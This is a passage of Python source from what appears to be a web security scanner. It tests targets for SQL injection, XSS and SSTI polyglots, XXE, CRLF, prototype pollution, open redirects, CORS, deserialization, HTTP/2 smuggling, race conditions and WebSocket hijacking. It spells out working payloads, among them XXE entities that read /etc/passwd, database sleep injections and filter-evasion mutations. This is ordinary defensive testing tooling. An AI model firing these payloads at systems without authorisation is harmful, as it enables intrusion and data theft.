            # Whitespace insertion
            mutations.append(payload.replace(' ', '%09'))  # Tab
            mutations.append(payload.replace(' ', '%0a'))  # Newline
            mutations.append(payload.replace(' ', '%0d'))  # Carriage return
            
            # Comment insertion (for SQL/JS)
            mutations.append(payload.replace(' ', '/**/'))
            
            # Null byte insertion
            mutations.append(payload.replace('=', '%00='))
            
            # HTML entity encoding
            mutations.append(payload.replace('<', '&lt;').replace('>', '&gt;'))
            mutations.append(payload.replace('<', '&#60;').replace('>', '&#62;'))
            
            return mutations
        
        test_cases = []
        for payload_type, base_payload in base_payloads.items():
            for i, mutated in enumerate(mutate_payload(base_payload)[:5]):  # Limit to 5 mutations per type
                test_cases.append({
                    'headers': {},
                    'path': f'/?test={quote_plus(mutated)}',
                    'technique': f'Mutated {payload_type.upper()} #{i+1}'
                })
        
        batch_results = self._batch_test(test_cases)
        for r in batch_results:
            r['category'] = 'PAYLOAD_MUTATION'
            results.append(r)
        
        return results
    
    def _test_polyglot_payloads(self) -> List[Dict[str, Any]]:
        """Polyglot payloads that work across multiple contexts"""
        results = []
        print("  [*] Testing polyglot payloads...")
        
        polyglots = [
            # XSS/HTML/JS polyglot
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
            
            # XSS/SQL polyglot
            "'-var x=1;alert(1)//\\';",
            
            # Universal XSS polyglot
            "-->'\"</script><script>alert(1)</script>",
            
            # SVG/XSS/Event polyglot
            "<svg/onload=\"'`*/'/*`*/alert(1)/*`*/'>",
            
            # SQL/XSS polyglot
            "1'<script>alert(1)</script>--",
            
            # Multiple context escape
            "{{constructor.constructor('alert(1)')()}}",
            
            # Template injection polyglot
            "${7*7}{{7*7}}<%=7*7%>${{7*7}}",
            
            # SSTI/XSS polyglot
            "{{''.__class__.__mro__[2].__subclasses__()}}<script>alert(1)</script>",
        ]
        
        test_cases = [
            {'headers': {}, 'path': f'/?p={quote_plus(poly)}', 'technique': f'Polyglot #{i+1}'}
            for i, poly in enumerate(polyglots)
        ]
        
        batch_results = self._batch_test(test_cases)
        for r in batch_results:
            r['category'] = 'POLYGLOT'
            results.append(r)
        
        return results
    
    def _test_time_based_detection(self) -> List[Dict[str, Any]]:
        """Confirm blind SQL injection with repeated, paired delay controls.

        This deliberately avoids CPU-heavy BENCHMARK payloads.  Safe mode skips
        the technique because even a short database sleep consumes server work.
        """
        print("  [*] Testing paired time-based SQL injection...")
        results = []

        targets = self._injection_targets()[:1]
        if targets:
            endpoint = targets[0]
            params = endpoint.get('params') or {}
            parameter = next(iter(params), 'id') if isinstance(params, dict) else 'id'
            base_path = endpoint.get('path') or '/'
        else:
            parameter, base_path = 'id', '/'

        def with_value(path: str, value: str) -> str:
            parts = urlsplit(path)
            pairs = parse_qsl(parts.query, keep_blank_values=True)
            replaced = False
            output = []
            for key, current in pairs:
                if key == parameter and not replaced:
                    output.append((key, value))
                    replaced = True
                else:
                    output.append((key, current))
            if not replaced:
                output.append((parameter, value))
            return urlunsplit(('', '', parts.path or '/', urlencode(output), parts.fragment))

        payload_pairs = [
            ('MySQL', "1' AND SLEEP(2)-- ", "1' AND SLEEP(0)-- "),
            ('PostgreSQL', "1';SELECT pg_sleep(2)--", "1';SELECT pg_sleep(0)--"),
            ('SQL Server', "1';WAITFOR DELAY '0:0:2'--", "1';WAITFOR DELAY '0:0:0'--"),
        ]

        for engine, attack_payload, control_payload in payload_pairs:
            attack_path = with_value(base_path, attack_payload)
            control_path = with_value(base_path, control_payload)
            attack_times, control_times = [], []
            status = 0
            try:
                # Alternate ordering to reduce false positives from monotonic
                # load changes between the first and second half of the test.
                for round_index in range(2):
                    order = [('control', control_path), ('attack', attack_path)]
                    if round_index % 2:
                        order.reverse()
                    round_values = {}
                    for label, path in order:
                        started = time.monotonic()
                        response = self._scoped_safe_request(
                            self._path_url(path), timeout=self.timeout + 4,
                            allow_redirects=False,
                        )
                        elapsed = time.monotonic() - started
                        if response is None:
                            round_values = {}
                            break
                        status = response.status_code
                        round_values[label] = elapsed
                    if len(round_values) == 2:
                        control_times.append(round_values['control'])
                        attack_times.append(round_values['attack'])
            except Exception as exc:
                logger.debug(f"Paired timing test error ({engine}): {exc}")

            if len(attack_times) != 2 or len(control_times) != 2:
                continue
            deltas = [attack - control for attack, control
                      in zip(attack_times, control_times)]
            median_delta = sum(sorted(deltas)) / 2.0
            if median_delta < 1.4 or any(delta < 1.2 for delta in deltas):
                continue

            fingerprint = hashlib.sha256(
                f"{urlparse(self.target).netloc}|GET|{urlsplit(base_path).path}|"
                f"TIME_BASED|{parameter}|{engine}".encode()
            ).hexdigest()[:24]
            result = {
                'technique': f'Time-based SQL injection ({engine})',
                'bypass': True, 'status': status, 'severity': 'HIGH',
                'category': 'INJECTION', 'kind': 'finding',
                'verification_status': 'confirmed', 'confidence': 'high',
                'reason': (f'Two paired probes delayed by {median_delta:.2f}s median '
                           f'({deltas[0]:.2f}s, {deltas[1]:.2f}s)'),
                'method': 'GET', 'path': attack_path,
                'url': self._path_url(attack_path), 'payload': attack_payload,
                'parameter': parameter,
                'insertion_point': {'type': 'query', 'name': parameter},
                'request': {'method': 'GET', 'url': self._path_url(attack_path),
                            'path': attack_path, 'headers': {}, 'body': None},
                'response': {'status': status},
                'baseline': {'scope': 'paired', 'request': {
                    'method': 'GET', 'url': self._path_url(control_path),
                    'path': control_path, 'headers': {}, 'body': None,
                }, 'timings_seconds': [round(v, 3) for v in control_times]},
                'comparison': {
                    'attack_timings_seconds': [round(v, 3) for v in attack_times],
                    'control_timings_seconds': [round(v, 3) for v in control_times],
                    'deltas_seconds': [round(v, 3) for v in deltas],
                },
                'evidence': [{
                    'type': 'paired_timing_delay',
                    'description': 'Repeated attack/control timing differential',
                    'matched': f'{median_delta:.2f}s median delay',
                }],
                'detector_id': 'sqli-paired-timing-v2',
                'fingerprint': fingerprint, 'finding_id': f'bt-{fingerprint}',
                '_no_reconfirm': True,
            }
            result['curl'] = build_curl('GET', result['url'], self._session.headers)
            results.append(result)
            print(f"  [✓] HIGH: paired time-based SQLi ({engine}, {parameter})")

        return results
    
    def _test_race_condition(self) -> List[Dict[str, Any]]:
        """Race condition testing with concurrent requests"""
        results = []
        print("  [*] Testing race conditions...")
        
        race_endpoints = [
            '/api/transfer',
            '/api/withdraw',
            '/checkout',
            '/redeem',
            '/apply-coupon',
            '/vote',
        ]
        
        def send_concurrent_requests(endpoint: str, count: int = 10) -> List[Dict]:
            """Send concurrent requests to detect race conditions"""
            responses = []
            
            def make_request():
                try:
                    start = time.time()
                    resp = self._scoped_safe_request(
                        f"{self.target}{endpoint}", method='POST',
                        data={'amount': '1'},
                        timeout=self.timeout,
                        verify=False
                    )
                    return {
                        'status': resp.status_code,
                        'time': time.time() - start,
                        'size': len(resp.content),
                        'content_hash': hashlib.md5(resp.content).hexdigest()[:8]
                    }
                except:
                    return None
            
            with ThreadPoolExecutor(max_workers=count) as executor:
                futures = [executor.submit(make_request) for _ in range(count)]
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        responses.append(result)
            
            return responses
        
        for endpoint in race_endpoints:
            try:
                responses = send_concurrent_requests(endpoint, 5)
                
                if len(responses) >= 2:
                    # Analyze for race condition indicators
                    statuses = [r['status'] for r in responses]
                    sizes = [r['size'] for r in responses]
                    hashes = [r['content_hash'] for r in responses]
                    
                    # Different responses might indicate race condition
                    if len(set(statuses)) > 1 or len(set(hashes)) > 1:
                        result = {
                            'technique': f'Race Condition: {endpoint}',
                            'bypass': True,
                            'status': statuses[0],
                            'reason': f'Inconsistent responses detected ({len(set(hashes))} variations)',
                            'severity': 'HIGH',
                            'category': 'RACE_CONDITION'
                        }
                        results.append(result)
                        print(f"  [✓] BYPASS: Race condition detected at {endpoint}")
                        
            except Exception as e:
                logger.debug(f"Race condition test error for {endpoint}: {e}")
        
        return results

    # ============================================================================
    # NEW SECURITY TESTS - HIGH VALUE
    # ============================================================================
    
    def _test_cors_misconfiguration(self) -> List[Dict[str, Any]]:
        """Apply browser-accurate CORS semantics and separate policy from impact."""
        results = []
        print("  [*] Testing CORS policy with controlled origins...")
        token = random.randrange(10**8, 10**9)
        controlled = f'https://blackthorn-{token}.invalid'
        host = urlparse(self.target).hostname or self.domain
        origins = ['null', controlled, f'https://{host}.blackthorn.invalid']

        for origin in origins:
            try:
                resp = self._scoped_safe_request(
                    self.target, timeout=self.timeout, allow_redirects=False,
                    headers={'Origin': origin},
                )
                if resp is None:
                    continue
                acao = resp.headers.get('Access-Control-Allow-Origin', '').strip()
                acac = resp.headers.get('Access-Control-Allow-Credentials', '').strip().lower()

                # Wildcard ACAO cannot be used by a credentialed browser request.
                # Record it only as normal public-resource policy context.
                if acao == '*':
                    results.append({
                        'technique': 'CORS wildcard policy', 'bypass': False,
                        'status': resp.status_code,
                        'reason': ('Wildcard ACAO observed; browsers reject wildcard '
                                   'credentialed reads, so this alone is not a vulnerability'),
                        'severity': 'INFO', 'category': 'CORS_MISCONFIG',
                        'kind': 'observation', 'verification_status': 'informational',
                        'confidence': 'high',
                        'details': {'acao': acao, 'acac': acac, 'origin_tested': origin},
                    })
                    continue

                if acao != origin:
                    continue

                credentialed = acac == 'true'
                protected_transition = False
                if credentialed:
                    try:
                        anonymous = self._recon_session.get(
                            self.target, headers={'Origin': origin}, timeout=self.timeout,
                            allow_redirects=False, verify=False,
                        )
                        protected_transition = (
                            anonymous.status_code in (401, 403)
                            and 200 <= resp.status_code < 400
                        )
                    except Exception:
                        protected_transition = False

                confirmed = credentialed and protected_transition
                reason = (
                    'Arbitrary origin can read a credentialed response that is denied anonymously'
                    if confirmed else
                    ('Arbitrary origin is reflected with credentials; verify that the '
                     'endpoint returns sensitive data' if credentialed else
                     'Arbitrary origin is allowed without credentials; impact depends on public data')
                )
                severity = 'HIGH' if confirmed else ('MEDIUM' if credentialed else 'LOW')
                result = {
                    'technique': f'CORS origin reflection: {origin[:40]}',
                    'bypass': True, 'status': resp.status_code, 'reason': reason,
                    'severity': severity, 'category': 'CORS_MISCONFIG',
                    'kind': 'finding' if confirmed else 'suspected',
                    'verification_status': 'confirmed' if confirmed else 'candidate',
                    'confidence': 'high' if confirmed else 'medium',
                    'method': 'GET', 'path': '/', 'url': self.target,
                    'request': {'method': 'GET', 'url': self.target, 'path': '/',
                                'headers': {'Origin': origin}, 'body': None},
                    'response': {'status': resp.status_code, 'headers': {
                        'access-control-allow-origin': acao,
                        'access-control-allow-credentials': acac,
                    }},
                    'evidence': [{
                        'type': ('credentialed_cross_origin_read' if confirmed
                                 else 'cors_policy_reflection'),
                        'description': reason,
                        'matched': f'ACAO: {acao}; ACAC: {acac or "absent"}',
                    }],
                    'details': {'acao': acao, 'acac': acac,
                                'origin_tested': origin},
                    '_no_reconfirm': True,
                }
                results.append(result)
                print(f"  [{'✓' if confirmed else '!'}] CORS: {reason}")
            except Exception as exc:
                logger.debug(f"CORS test error: {exc}")
        return results
    
    def _test_open_redirect(self) -> List[Dict[str, Any]]:
        """Require Location to resolve to an exact controlled external host."""
        print("  [*] Testing open redirects with parsed Location hosts...")
        controlled = 'blackthorn.invalid'
        target_host = urlparse(self.target).hostname or 'target'
        values = [
            f'https://{controlled}/callback',
            f'//{controlled}/callback',
            f'https://{target_host}@{controlled}/callback',
            f'https://{target_host}.{controlled}/callback',
        ]
        parameters = [
            'redirect', 'url', 'next', 'return', 'returnUrl', 'return_url',
            'continue', 'dest', 'destination', 'redir', 'redirect_uri',
            'target', 'view', 'to', 'out', 'go', 'link',
        ]
        allowed_hosts = [controlled, f'{target_host}.{controlled}']
        test_cases = []
        for parameter in parameters:
            for value in values:
                test_cases.append({
                    'headers': {}, 'path': '/?' + urlencode({parameter: value}),
                    'technique': f'Open redirect: {parameter}',
                    'category': 'OPEN_REDIRECT', 'parameter': parameter,
                    'payload': value, 'detector_id': 'open-redirect-location-v2',
                    'oracle': {
                        'type': 'redirect', 'hosts': allowed_hosts,
                        'base_url': self.target, 'severity': 'HIGH',
                        'reason': ('Location resolved to the exact controlled '
                                   'external origin'),
                    },
                })
        results = [
            result for result in self._batch_test(test_cases)
            if self._result_has_evidence(result, 'external_redirect')
        ]
        for result in results:
            location = str((result.get('response') or {}).get('headers', {}).get('location', ''))
            print(f"  [✓] Open Redirect: {result.get('parameter')} -> {location[:60]}")
        return results
    
    def _test_crlf_injection(self) -> List[Dict[str, Any]]:
        """Require an exact randomized response header/body-boundary canary."""
        print("  [*] Testing CRLF injection with exact response canaries...")
        suffix = str(random.randrange(10**8, 10**9))
        header_name = f'X-Blackthorn-{suffix}'
        header_value = f'bt-{suffix}'
        encoded_lines = ('%0d%0a', '%0D%0A', '%0a', '%E5%98%8D%E5%98%8A')
        test_cases = []
        for line_break in encoded_lines:
            wire_payload = f'clean{line_break}{header_name}:{header_value}'
            path = f'/?param={wire_payload}'
            test_cases.append({
                'headers': {}, 'path': path,
                'technique': f'CRLF response header injection ({line_break})',
                'category': 'CRLF_INJECTION', 'parameter': 'param',
                'payload': wire_payload,
                'detector_id': 'crlf-exact-header-v2',
                'oracle': {
                    'type': 'header', 'name': header_name, 'value': header_value,
                    'severity': 'HIGH',
                    'reason': f'Injected response header observed: {header_name}: {header_value}',
                },
            })

        return [
            r for r in self._batch_test(test_cases)
            if self._result_has_evidence(r, 'response_header_injection')
        ]
    
    def _test_prototype_pollution(self) -> List[Dict[str, Any]]:
        """Test for prototype pollution vulnerabilities"""
        results = []
        print("  [*] Testing prototype pollution...")
        
        pollution_payloads = [
            # Query string pollution
            ('?__proto__[polluted]=true', 'query __proto__'),
            ('?__proto__.polluted=true', 'query __proto__ dot'),
            ('?constructor[prototype][polluted]=true', 'query constructor.prototype'),
            ('?constructor.prototype.polluted=true', 'query constructor.prototype dot'),
            # Array notation
            ('?__proto__[0]=polluted', 'array proto'),
            # Nested pollution
            ('?a[__proto__][polluted]=true', 'nested proto'),
            # Common framework params
            ('?config[__proto__][polluted]=true', 'config proto'),
            ('?settings[__proto__][polluted]=true', 'settings proto'),
            # JSON body pollution 
        ]
        
        test_cases = [
            {
                'headers': {}, 'path': path,
                'technique': f'Prototype pollution candidate: {technique}',
                'category': 'PROTOTYPE_POLLUTION', 'payload': path,
                'detector_id': 'prototype-behavior-differential-v2',
            }
            for path, technique in pollution_payloads # test cases for query string pollution
        ]
        
        batch_results = self._batch_test(test_cases) # test cases for query string pollution
        
        # Also test JSON body pollution
        json_payloads = [
            {'__proto__': {'polluted': True}},
            {'constructor': {'prototype': {'polluted': True}}},
            {'a': {'__proto__': {'polluted': True}}},
        ]
        
        for json_payload in json_payloads: # test cases for JSON body pollution
            try:
                payload_text = json.dumps(json_payload)
                result = self._test_request(
                    method='POST', path='/', data=payload_text,
                    headers={'Content-Type': 'application/json'},
                    technique='Prototype pollution JSON candidate',
                    probe={
                        'category': 'PROTOTYPE_POLLUTION', 'payload': payload_text,
                        'insertion_point': {'type': 'json-body', 'name': '__proto__'},
                        'detector_id': 'prototype-behavior-differential-v2',
                    },
                )
                if result and result.get('bypass'):
                    # A response delta is only a candidate; acceptance/reflection
                    # does not prove Object.prototype was modified.
                    result['verification_status'] = 'candidate'
                    result['kind'] = 'suspected'
                    result['severity'] = 'MEDIUM'
                    result['reason'] = ('JSON prototype payload changed the matched '
                                        'response; persistent property impact is unverified')
                    results.append(result)
                    print("  [!] Prototype pollution behavior candidate")
                        
            except Exception as e:
                logger.debug(f"JSON pollution test error: {e}")
        
        for r in batch_results:
            r['category'] = 'PROTOTYPE_POLLUTION'
            if r.get('bypass'):
                results.append(r)
        
        return results
    
    def _test_ssti_detection(self) -> List[Dict[str, Any]]:
        """Detect SSTI with two independent transformed canaries per syntax.

        Older checks searched for words already present in payloads (``class``,
        ``config``, ``subclasses``) and therefore promoted reflection to CRITICAL.
        A finding now requires two arithmetic results that are absent from both
        the raw payload and the matched benign response.
        """
        print("  [*] Testing SSTI with paired evaluation canaries...")
        results: List[Dict[str, Any]] = []
        from .crawler import build_injection_path

        targets = self._injection_targets()[:5]
        if not targets:
            targets = [{'path': '/', 'params': {'test': 'blackthorn-control'}, 'method': 'GET'}]

        syntaxes = [
            ('Jinja2 / Twig / Pebble', lambda a, b: '{{%d*%d}}' % (a, b)),
            ('Freemarker / Mako / EL', lambda a, b: '${%d*%d}' % (a, b)),
            ('Freemarker alternate', lambda a, b: '#{%d*%d}' % (a, b)),
            ('ERB', lambda a, b: '<%%=%d*%d%%>' % (a, b)),
            ('Smarty', lambda a, b: '{%d*%d}' % (a, b)),
            ('Thymeleaf inline', lambda a, b: '[[${%d*%d}]]' % (a, b)),
        ]
        operand_pairs = ((37, 41), (43, 47))

        for ep in targets:
            path, params = ep['path'], dict(ep['params'])
            for parameter in params:
                control_path = build_injection_path(
                    path, params, parameter, params.get(parameter, 'blackthorn-control')
                )
                for engine, formatter in syntaxes:
                    paired = []
                    for left, right in operand_pairs:
                        payload = formatter(left, right)
                        expected = str(left * right)
                        probe_path = build_injection_path(path, params, parameter, payload)
                        result = self._test_request(
                            path=probe_path,
                            technique=f'SSTI: {engine} [{parameter}]',
                            probe={
                                'category': 'SSTI', 'payload': payload,
                                'parameter': parameter,
                                'insertion_point': {'type': 'query', 'name': parameter},
                                'detector_id': 'ssti-paired-arithmetic-v2',
                                'control': {'method': 'GET', 'path': control_path,
                                            'headers': {}, 'data': None},
                                'oracle': {
                                    'type': 'marker', 'value': expected,
                                    'payload': payload, 'severity': 'HIGH',
                                    'reason': (f'Template expression evaluated: '
                                               f'{payload} → {expected}'),
                                },
                            },
                        )
                        if result and result.get('verification_status') == 'confirmed':
                            paired.append(result)
                    if len(paired) != 2:
                        continue

                    finding = paired[0]
                    finding['reason'] = (
                        f'Two independent {engine} expressions evaluated: '
                        f"{paired[0]['payload']} and {paired[1]['payload']}"
                    )
                    finding['evidence'] = (
                        list(paired[0].get('evidence') or []) +
                        list(paired[1].get('evidence') or [])
                    )
                    finding['payloads'] = [p['payload'] for p in paired]
                    finding['verification_status'] = 'confirmed'
                    finding['kind'] = 'finding'
                    finding['confidence'] = 'high'
                    finding['confirmations'] = '2/2 paired probes'
                    finding['details'] = {
                        'engine': engine, 'payloads': finding['payloads'],
                        'parameter': parameter,
                    }
                    results.append(finding)
                    print(f"  [✓] HIGH: SSTI confirmed ({engine}, {parameter})")
        return results
    
    def _test_xxe_detection(self) -> List[Dict[str, Any]]:
        """Test for XML External Entity (XXE) injection"""
        results = []
        print("  [*] Testing XXE (XML External Entity)...")
        
        xxe_payloads = [
            # Basic file read
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', 'file read'),
            # PHP filter
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>', 'php filter'),
            # Parameter entity
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo></foo>', 'parameter entity'),
            # XInclude
            ('<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>', 'XInclude'),
        ]
        
        xml_endpoints = [
            self.target,
            f"{self.target}/api",
            f"{self.target}/upload",
            f"{self.target}/import",
            f"{self.target}/parse",
        ]
        
        for endpoint in xml_endpoints:
            for payload, technique in xxe_payloads:
                try:
                    endpoint_path = urlparse(endpoint).path or '/'
                    result = self._test_request(
                        method='POST', path=endpoint_path, data=payload,
                        headers={'Content-Type': 'application/xml'},
                        technique=f'XXE: {technique}',
                        probe={
                            'category': 'XXE', 'payload': payload,
                            'insertion_point': {'type': 'body', 'name': 'xml'},
                            'detector_id': 'xxe-file-signature-v2',
                            'control': {
                                'method': 'POST', 'path': endpoint_path,
                                'headers': {'Content-Type': 'application/xml'},
                                'data': '<?xml version="1.0"?><foo>blackthorn-control</foo>',
                            },
                            'oracle': {
                                'type': 'regex',
                                'patterns': [r'(?m)^root:[^:\r\n]*:0:0:',
                                             r'(?m)^daemon:[^:\r\n]*:\d+:\d+:'],
                                'severity': 'CRITICAL',
                                'reason': 'External entity returned Unix account-file contents',
                            },
                        },
                    )
                    if self._result_has_evidence(result, 'response_signature'):
                        result['details'] = {'endpoint': endpoint, 'technique': technique}
                        results.append(result)
                        print(f"  [✓] CRITICAL: XXE detected ({technique})")
                                
                except Exception as e:
                    logger.debug(f"XXE test error: {e}")
        
        # Also test SOAP endpoints
        soap_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
<soap:Body><foo>&xxe;</foo></soap:Body>
</soap:Envelope>'''
        
        soap_endpoints = ['/soap', '/wsdl', '/ws', '/service', '/api/soap']
        for endpoint in soap_endpoints:
            try:
                result = self._test_request(
                    method='POST', path=endpoint, data=soap_payload,
                    headers={'Content-Type': 'application/soap+xml'},
                    technique='XXE: SOAP endpoint',
                    probe={
                        'category': 'XXE', 'payload': soap_payload,
                        'insertion_point': {'type': 'body', 'name': 'soap'},
                        'detector_id': 'xxe-soap-file-signature-v2',
                        'control': {
                            'method': 'POST', 'path': endpoint,
                            'headers': {'Content-Type': 'application/soap+xml'},
                            'data': ('<?xml version="1.0"?><soap:Envelope '
                                     'xmlns:soap="http://www.w3.org/2003/05/soap-envelope">'
                                     '<soap:Body><foo>blackthorn-control</foo></soap:Body>'
                                     '</soap:Envelope>'),
                        },
                        'oracle': {
                            'type': 'regex',
                            'patterns': [r'(?m)^root:[^:\r\n]*:0:0:'],
                            'severity': 'CRITICAL',
                            'reason': 'SOAP external entity returned Unix account-file contents',
                        },
                    },
                )
                if self._result_has_evidence(result, 'response_signature'):
                    results.append(result)
                    print(f"  [✓] CRITICAL: SOAP XXE detected")
            except Exception as e:
                logger.debug(f"SOAP XXE test error: {e}")
        
        return results
    
    def _test_deserialization(self) -> List[Dict[str, Any]]:
        """Test for insecure deserialization vulnerabilities"""
        results = []
        print("  [*] Testing insecure deserialization...")
        
        # Java serialization magic bytes (base64)
        java_payloads = [
            # ysoserial CommonCollections payloads (base64 encoded markers)
            ('rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==', 'Java HashMap'),
            ('rO0ABXNyABNqYXZhLnV0aWwuSGFzaHRhYmxl', 'Java Hashtable'),
        ]
        
        # PHP serialization
        php_payloads = [
            ('O:8:"stdClass":0:{}', 'PHP Object'),
            ('a:1:{s:4:"test";s:4:"test";}', 'PHP Array'),
            # PHP POP chain attempt
            ('O:10:"__destruct":0:{}', 'PHP destruct'),
        ]
        
        # Python pickle (base64)
        python_payloads = [
            ('gASVEAAAAAAAAACMBHRlc3SUjAR0ZXN0lIaULg==', 'Python pickle'),
        ]
        
        # .NET ViewState
        dotnet_payloads = [
            ('__VIEWSTATE', 'ASP.NET ViewState'),
        ]
        
        # Test Java serialization
        for payload, technique in java_payloads:
            try:
                result = self._test_request(
                    method='POST', path='/', data=payload,
                    headers={'Content-Type': 'application/x-java-serialized-object'},
                    technique=f'Deserialization surface: {technique}',
                    probe={
                        'category': 'DESERIALIZATION', 'payload': payload,
                        'insertion_point': {'type': 'body', 'name': 'serialized-object'},
                        'detector_id': 'deserialization-parser-observation-v2',
                    },
                )
                if result is not None and result.get('status') not in [400, 415]:
                    result.update({
                        'bypass': False, 'kind': 'observation',
                        'verification_status': 'informational', 'confidence': 'medium',
                        'severity': 'INFO',
                        'reason': ('Endpoint accepted the serialization media type; '
                                   'object deserialization or gadget execution is unproven'),
                    })
                    results.append(result)
                    print(f"  [+] Serialization surface: {technique} accepted")
                    
            except Exception as e:
                logger.debug(f"Java deser test error: {e}")
        
        # Test PHP serialization
        for payload, technique in php_payloads:
            try:
                body_result = self._test_request(
                    method='POST', path='/', data=payload,
                    headers={'Content-Type': 'application/x-php-serialized'},
                    technique=f'Deserialization candidate: {technique} (body)',
                    probe={
                        'category': 'DESERIALIZATION', 'payload': payload,
                        'insertion_point': {'type': 'body', 'name': 'serialized-object'},
                        'detector_id': 'php-deserialization-response-v2',
                        'oracle': {
                            'type': 'regex',
                            'patterns': [r'object of class stdclass',
                                         r'unserialize\(\).{0,120}(?:notice|warning|error)'],
                            'severity': 'MEDIUM', 'confidence': 'medium',
                            'verification_status': 'candidate', 'kind': 'suspected',
                            'reason': 'PHP unserialize-specific response appeared only after the probe',
                        },
                    },
                )
                query_result = self._test_request(
                    path='/?' + urlencode({'data': payload}),
                    technique=f'Deserialization candidate: {technique} (query)',
                    probe={
                        'category': 'DESERIALIZATION', 'payload': payload,
                        'parameter': 'data',
                        'insertion_point': {'type': 'query', 'name': 'data'},
                        'detector_id': 'php-deserialization-response-v2',
                        'oracle': {
                            'type': 'regex',
                            'patterns': [r'object of class stdclass',
                                         r'unserialize\(\).{0,120}(?:notice|warning|error)'],
                            'severity': 'MEDIUM', 'confidence': 'medium',
                            'verification_status': 'candidate', 'kind': 'suspected',
                            'reason': 'PHP unserialize-specific response appeared only after the probe',
                        },
                    },
                )
                for candidate in (body_result, query_result):
                    if candidate and candidate.get('bypass'):
                        results.append(candidate)
                        print(f"  [!] Deserialization candidate: {technique}")
                            
            except Exception as e:
                logger.debug(f"PHP deser test error: {e}")
        
        # Check for ViewState
        try:
            resp = self._scoped_safe_request(self.target, timeout=self.timeout)
            if resp is not None and '__VIEWSTATE' in resp.text:
                # Check if ViewState is unencrypted/unsigned
                import re
                viewstate_match = re.search(r'__VIEWSTATE["\s]+value="([^"]+)"', resp.text)
                if viewstate_match:
                    viewstate = viewstate_match.group(1)
                    # Check if it's base64 (unencrypted)
                    if viewstate.startswith('/w') or viewstate.startswith('dD'):
                        result = {
                            'technique': 'Deserialization: ASP.NET ViewState',
                            'bypass': False,
                            'status': resp.status_code,
                            'reason': ('ASP.NET ViewState field detected; base64 encoding '
                                       'does not prove missing MAC or encryption'),
                            'severity': 'INFO',
                            'category': 'DESERIALIZATION',
                            'kind': 'observation',
                            'verification_status': 'informational',
                            'confidence': 'high',
                            'details': {'viewstate_preview': viewstate[:50]}
                        }
                        results.append(result)
                        print(f"  [!] ASP.NET ViewState detected (potentially exploitable)")
        except Exception as e:
            logger.debug(f"ViewState check error: {e}")
        
        return results
    
    def _test_http2_specific_attacks(self) -> List[Dict[str, Any]]:
        """Test HTTP/2 specific attacks including H2C smuggling"""
        results = []
        print("  [*] Testing HTTP/2 specific attacks...")
        
        # H2C (HTTP/2 Cleartext) Smuggling
        h2c_tests = [
            # Standard H2C upgrade
            {
                'headers': {
                    'Upgrade': 'h2c',
                    'Connection': 'Upgrade, HTTP2-Settings',
                    'HTTP2-Settings': 'AAMAAABkAARAAAAAAAIAAAAA',
                },
                'technique': 'H2C Upgrade Standard'
            },
            # H2C with request smuggling
            {
                'headers': {
                    'Upgrade': 'h2c',
                    'Connection': 'Upgrade, HTTP2-Settings',
                    'HTTP2-Settings': 'AAMAAABkAARAAAAAAAIAAAAA',
                    'Content-Length': '0',
                },
                'technique': 'H2C Smuggling Attempt'
            },
            # HTTP/2 CONNECT method
            {
                'headers': {
                    ':method': 'CONNECT',
                    ':authority': 'internal-server:80',
                },
                'technique': 'HTTP/2 CONNECT Tunnel'
            },
        ]
        
        for test in h2c_tests:
            try:
                resp = self._scoped_safe_request(
                    self.target,
                    timeout=self.timeout,
                    headers=test['headers'],
                    allow_redirects=False
                )
                
                if resp is not None:
                    # Check for successful H2C upgrade
                    if resp.status_code == 101 or 'upgrade' in resp.headers.get('Connection', '').lower():
                        result = {
                            'technique': f"HTTP/2: {test['technique']}",
                            'bypass': True,
                            'status': resp.status_code,
                            'reason': 'H2C upgrade accepted - potential smuggling',
                            'severity': 'HIGH',
                            'category': 'HTTP2_ATTACK'
                        }
                        results.append(result)
                        print(f"  [✓] HTTP/2 Attack: {test['technique']} successful")
                        
            except Exception as e:
                logger.debug(f"HTTP/2 test error: {e}")
        
        # CONTINUATION Frame Flood (detection only)
        result = {
            'technique': 'HTTP/2: CONTINUATION Frame Check',
            'bypass': False,
            'status': 0,
            'reason': 'Manual testing recommended for CONTINUATION flood',
            'severity': 'INFO',
            'category': 'HTTP2_ATTACK'
        }
        results.append(result)
        
        return results
    
    def _test_websocket_security(self) -> List[Dict[str, Any]]:
        """Test WebSocket security including CSWSH"""
        results = []
        print("  [*] Testing WebSocket security...")
        
        # Common WebSocket endpoints
        ws_endpoints = [
            '/ws', '/websocket', '/socket', '/socket.io',
            '/realtime', '/live', '/stream', '/push',
            '/api/ws', '/api/websocket', '/chat', '/notifications'
        ]
        
        ws_tests = []
        for endpoint in ws_endpoints:
            # Test Cross-Site WebSocket Hijacking (CSWSH)
            ws_tests.append({
                'headers': {
                    'Upgrade': 'websocket',
                    'Connection': 'Upgrade',
                    'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                    'Sec-WebSocket-Version': '13',
                    'Origin': 'https://blackthorn.invalid',  # Controlled cross-origin canary
                },
                'path': endpoint,
                'technique': f'CSWSH: {endpoint}'
            })
            
            # Test without Origin header
            ws_tests.append({
                'headers': {
                    'Upgrade': 'websocket',
                    'Connection': 'Upgrade',
                    'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                    'Sec-WebSocket-Version': '13',
                },
                'path': endpoint,
                'technique': f'WS No Origin: {endpoint}'
            })
        
        for test in ws_tests:
            try:
                resp = self._scoped_safe_request(
                    f"{self.target}{test['path']}",
                    timeout=self.timeout,
                    headers=test['headers'],
                    allow_redirects=False
                )
                
                if resp is not None:
                    # 101 Switching Protocols means WebSocket upgrade succeeded
                    if resp.status_code == 101:
                        is_cswsh = 'blackthorn.invalid' in test['headers'].get('Origin', '')
